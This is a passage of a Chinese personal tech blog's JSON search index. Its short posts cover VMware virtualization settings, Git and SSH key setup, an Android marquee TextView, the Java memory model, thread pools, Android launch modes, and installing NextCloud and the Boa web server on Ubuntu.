technology，将其设置为ENABLE就可以了。 1注：这个问题是Intel virtual technology没开启导致的，所以在新安装VM的时候也会出现。","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare","slug":"VMWare","permalink":"http://yoursite.com/tags/VMWare/"}]},{"title":"Git配置","slug":"git/Git配置","date":"2016-06-06T08:26:36.000Z","updated":"2016-06-06T08:26:36.000Z","comments":true,"path":"git/Git配置/","link":"","permalink":"http://yoursite.com/git/Git配置/","excerpt":"","text":"在Ubuntu下配置Git12345$ git config --global user.name \"username\"$ git config --global user.email \"useremail@mail.com\"$ ssh-keygen -t rsa -C \"useremail@mail.com\"$ cd ~/.ssh$ cat id_rsa.pub id_rsa.pub 是公钥信息，贴在Github上，就能push代码了。","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"Android TextView跑马灯","slug":"Android/Android TextView跑马灯","date":"2016-04-20T01:52:36.000Z","updated":"2021-12-28T03:24:10.103Z","comments":true,"path":"Android/Android TextView跑马灯/","link":"","permalink":"http://yoursite.com/Android/Android TextView跑马灯/","excerpt":"","text":"1234567891011121314&lt;TextView android:id=\"@+id/tv\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"你好测试用例啊啊啊啊啊\" android:fontFamily=\"@font/square_pixel_16\" android:textSize=\"200sp\" android:singleLine=\"true\" android:scrollHorizontally=\"true\" android:ellipsize=\"marquee\" android:focusable=\"true\" android:focusableInTouchMode=\"true\" android:marqueeRepeatLimit=\"marquee_forever\"/&gt;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"tv","slug":"tv","permalink":"http://yoursite.com/tags/tv/"}]},{"title":"Java内存模型","slug":"Java/Java内存模型","date":"2015-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.148Z","comments":true,"path":"Java/Java内存模型/","link":"","permalink":"http://yoursite.com/Java/Java内存模型/","excerpt":"","text":"Java的内存模型(JMM)规定了所有的变量都是存在于 主内存(RAM) 当中的，而每个线程都有自己的工作内存或者本地内存，线程对变量的所有操作都必须在自己的工作内存中进行，而不能直接对主内存操作，并且每个线程都不能访问其他线程的工作内存或者本地内存 。 比如，在某个线程中对变量 i 的复制操作 i=1，改线程必须在本地内存中对 i 进行修改之后才能将其写入 主内存 之中。 Java内存模型(JMM)三大特性一、原子性所有操作都执行或者都不执行 如何保证原子性？JMM只保证了基本读取和赋值的原子性操作，其他的不保证，如果想要使得某些代码片段具备原子性，需要使用关键字synchronized，或者JUC中的lock。 总结：volatile关键字不具备保证原子性的语义 二、有序性程序代码在执行过程中的先后顺序（编译器优化会导致不是开发者写的顺序）具有保证顺序性的语义 Java提供三种方式保证有序性： 使用volatile保证有序性 使用synchronized保证有序性 使用显式锁Lock来保证有序性 volatile 变量规则 对一个变量的写操作要早于对这个变量之后的读操作。 根据字面的意思来理解是，如果一个变量使用volatile关键字修饰，一个线程对它进行读操作，一个线程对它进行写操作，那么写入操作肯定要先行发生于读操作 三、可见性当一个线程对共享变量进行修改，那么另外的线程可以立刻看到修改后的最新值。 Java提供三种方式保证可见性： 使用关键字volatile，当一个变量被volatile修饰，对于共享资源的读操作直接在主内存中进行，当其他线程对该共享资源进行修改，会导致当前线程在工作内存中的共享资源失效，所以必须从主内存中再次获取，对于共享资源的写操作当然是先要修改工作内存，然后刷新到主内存。 synchronized能保证可见性 通过JUC的显式锁也能保证可见性。 总结：volatile具有保证可见性的语义 volatile关键字深入解析语义被volatile修饰的实例变量或者类变量具备如下两层语义 保证不同线程之间对共享变量操作时的可见性（一个线程修改，另外一个线程立刻看到最新值） 禁止对指令进行重排序操作。 volatile使用场景 多线程之间变量的可见性 有序性","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Java线程池","slug":"Java/Java线程池","date":"2015-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.149Z","comments":true,"path":"Java/Java线程池/","link":"","permalink":"http://yoursite.com/Java/Java线程池/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package com.demo;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.ScheduledExecutorService;import java.util.concurrent.TimeUnit;public class Test &#123; public static void main(String[] args) &#123; System.out.println(Runtime.getRuntime().availableProcessors()); //testSingleThreadExecutor(); //testFixedThreadPool(); //testCachedThreadPool(); &#125; /** * 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待 */ public static void testFixedThreadPool()&#123; //因为线程池大小为3，每个任务输出index后sleep 2秒，所以每两秒打印3个数字。 //定长线程池的大小最好根据系统资源进行设置。如获取cpu核心数Runtime.getRuntime().availableProcessors() ExecutorService fixedThreadPool = Executors.newFixedThreadPool(3); for (int i = 0; i &lt; 10; i++) &#123; final int index = i; fixedThreadPool.execute(new Runnable() &#123; public void run() &#123; try &#123; System.out.println(index); Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;); &#125; &#125; /** * 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。 */ public static void testCachedThreadPool()&#123; ExecutorService cachedThreadPool = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 10; i++) &#123; final int index = i; try &#123; Thread.sleep(index * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; cachedThreadPool.execute(new Runnable() &#123; public void run() &#123; System.out.println(index); &#125; &#125;); &#125; &#125; /** * 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行 */ public static void testSingleThreadExecutor()&#123; ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor(); for (int i = 0; i &lt; 10; i++) &#123; final int index = i; singleThreadExecutor.execute(new Runnable() &#123; public void run() &#123; try &#123; System.out.println(index); Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;); &#125; &#125; /** * 创建一个定长线程池，支持定时及周期性任务执行 */ public static void testScheduledThreadPool()&#123; ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5); scheduledThreadPool.schedule(new Runnable() &#123; public void run() &#123; System.out.println(&quot;delay 3 seconds&quot;); &#125; //延迟3秒执行 &#125;, 3, TimeUnit.SECONDS); //延迟1秒后每3秒执行一次。 //&#125;, 3, TimeUnit.SECONDS); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Android 启动模式备忘","slug":"Android/Android 启动模式备忘","date":"2014-04-20T01:52:36.000Z","updated":"2021-12-28T03:24:10.105Z","comments":true,"path":"Android/Android 启动模式备忘/","link":"","permalink":"http://yoursite.com/Android/Android 启动模式备忘/","excerpt":"","text":"1.standard 标准模式每次启动都new一个实例 2.singleTop 栈顶复用模式（栈顶单例模式）1android:launchMode=&quot;singleTop&quot; 如果Activity实例处于任务栈栈顶，再启动相同的Activity不会new出一个实例，只会有一个实例。 如果Activity实例存在任务栈不处于栈顶，和standard一样new实例。 3.singleTask 栈内复用模式（栈内单例模式）一个任务栈内，只有一个实例，即一个App(任务栈)内一个实例1android:launchMode=&quot;singleTask&quot; 如果Activity实例处于任务栈栈内，但不处于栈顶，启动该Activity会把此实例移到栈顶，并将该实例上面的Activity移除。使用场景：打开很多页面，一键返回到主页（主页Activity处于singleTask模式） 4.SingleInstance全局单例模式多个任务栈内，只有一个实例，即一部手机（系统运行时）内一个实例1android:launchMode=&quot;singleInstance&quot; 无论是从哪一个任务栈Task中启动Activity，只会创建一个Activity实例，并且使用一个全新的Task栈来加载该Activity实例。 5.清除任务栈增加两个Flags可以销毁旧的任务栈，重新建立一个任务栈，使用场景：含有多个Activity在任务栈，一步实现“退出登录”。12345val intent = Intent(this,LoginActivity::class.java)//清除任务栈intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)startActivity(intent)","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"启动模式","slug":"启动模式","permalink":"http://yoursite.com/tags/启动模式/"}]},{"title":"Ubuntu 安装 NextCloud 服务","slug":"Linux/Ubuntu 安装 NextCloud服务","date":"2012-11-06T14:58:36.000Z","updated":"2021-12-28T03:24:10.174Z","comments":true,"path":"Linux/Ubuntu 安装 NextCloud服务/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 安装 NextCloud服务/","excerpt":"","text":"123456789101112131415161718Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-122-generic x86_64)cn@cnserver:~$ sudo apt install snapd[sudo] password for cn: Reading package lists... DoneBuilding dependency tree Reading state information... Donesnapd is already the newest version (2.47.1+18.04).snapd set to manually installed.The following packages were automatically installed and are no longer required: aufs-tools cgroupfs-mount containerd.io docker-ce-cli libdumbnet1 libltdl7 pigzUse &apos;sudo apt autoremove&apos; to remove them.0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.cn@cnserver:~$ cn@cnserver:~$ cn@cnserver:~$ cn@cnserver:~$ sudo snap install nextcloudnextcloud 20.0.1snap1 from Nextcloud✓ installed 安装完就启动了，默认端口是80，访问IP:80即可。","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"NextCloud","slug":"NextCloud","permalink":"http://yoursite.com/tags/NextCloud/"}]},{"title":"Ubuntu 安装 Boa Web服务","slug":"Linux/Ubuntu 安装 Boa","date":"2012-06-28T14:58:36.000Z","updated":"2021-12-28T03:24:10.174Z","comments":true,"path":"Linux/Ubuntu 安装 Boa/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 安装 Boa/","excerpt":"","text":"Boa是一个只有大概60KB的WebServer，很适合运行在嵌入式硬件设备的Web服务。 在 X86-Ubuntu中安装Boa的日志：1234567891011121314151617181920212223242526272829303132333435363738$ wget http://www.boa.org/boa-0.94.14rc21.tar.gz$ tar zxvf boa-0.94.14rc21.tar.gz$ cd boa-0.94.14rc21/$ lsaclocal.m4 config.guess configure contrib CREDITS examples extras Makefile.in srcCHANGES config.sub configure.in COPYING docs extra_macros.m4 install-sh README$ ./configure$ make$ ls src/access.c boa.c buffer.o compat.h defines.h get.o index_dir.o Makefile pipe.o range.o response.c signals.o util.caccess.h boa.h cgi.c config.c escape.c globals.h ip.c Makefile.in poll.c read.c response.o sublog.c util.oalias.c boa_indexer cgi_header.c config.h escape.h hash.c ip.o mmap_cache.c queue.c read.o select.c sublog.oalias.o boa.o cgi_header.o config.h.in escape.o hash.o log.c mmap_cache.o queue.o request.c select.o timestamp.cboa buffer.c cgi.o config.o get.c index_dir.c log.o pipe.c range.c request.o signals.c timestamp.o$ sudo mkdir /etc/boa$ ls contrib/rpm/boa.conf boa.init-redhat boa.init-suse boa.logrotate boa.spec$ sudo cp contrib/rpm/boa.conf /etc/boa$ sudo ./src/boa[13/Oct/2020:02:37:06 +0000] No such group: nobody[13/Oct/2020:02:37:06 +0000] log.c:53 (open_logs) - unable to open error log: No such file or directory$ sudo mkdir /var/log/boa$ sudo vim /etc/boa/boa.conf#修改默认端口Port 8080#修改运行身份User 0Group 0#html存放路径DocumentRoot /www$ sudo ./src/boa$ ps -ef|grep boaroot 48727 1 0 11:00 pts/0 00:00:00 ./src/boa$ netstat -tnlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN -","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Boa","slug":"Boa","permalink":"http://yoursite.com/tags/Boa/"}]},{"title":"空白主题","slug":"空白","date":"1989-12-31T17:01:01.000Z","updated":"1989-12-31T17:01:01.000Z","comments":true,"path":"空白/","link":"","permalink":"http://yoursite.com/空白/","excerpt":"","text":"","categories":[],"tags":[]}]}